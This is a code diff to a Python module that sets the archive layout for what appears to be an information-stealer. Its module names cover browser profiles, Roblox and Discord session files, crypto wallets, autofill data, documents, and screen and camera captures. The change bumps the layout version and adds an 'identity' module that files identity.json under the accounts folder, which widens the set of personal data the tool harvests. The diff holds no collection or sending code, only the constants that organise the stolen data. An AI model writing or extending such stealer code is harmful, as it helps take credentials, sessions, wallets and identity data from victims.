@@ -23,7 +23,7 @@ from typing import Any, Final
 # the config schema: cfg.json stayed at 1, because an old config and a new layout are
 # not the same contract and tying them together would have forced a migration for no
 # reader's benefit.
-LAYOUT_VERSION: Final[int] = 2
+LAYOUT_VERSION: Final[int] = 3
 
 MANIFEST_MEMBER: Final[str] = "manifest.json"
 SUMMARY_MEMBER: Final[str] = "summary.txt"
@@ -41,6 +41,7 @@ MODULE_DIRS: Final[dict[str, str]] = {
     "browsers": "browsers",
     "roblox": "accounts",
     "sessions": "accounts",
+    "identity": "accounts",
     "wallets": "wallets",
     "autofill": "autofill",
     "documents": "documents",
@@ -57,6 +58,7 @@ MODULE_PREFIXES: Final[dict[str, tuple[str, ...]]] = {
     "browsers": ("",),  # one tree per browser/profile, all of it owned
     "roblox": ("roblox_session.txt", "roblox_status.json"),
     "sessions": ("discord_session.txt", "sessions.json"),
+    "identity": ("identity.json",),
     "wallets": ("",),
     "autofill": ("",),
     "documents": ("documents.json",),
@@ -67,7 +69,7 @@ MODULE_PREFIXES: Final[dict[str, tuple[str, ...]]] = {
 # Modules whose directory is shared, and the file names that disambiguate them.
 SHARED_DIRS: Final[dict[str, tuple[str, ...]]] = {
     "captures": ("screen", "camera"),
-    "accounts": ("roblox", "sessions"),
+    "accounts": ("roblox", "sessions", "identity"),
     "system": ("system", "network", "displays"),
 }
 
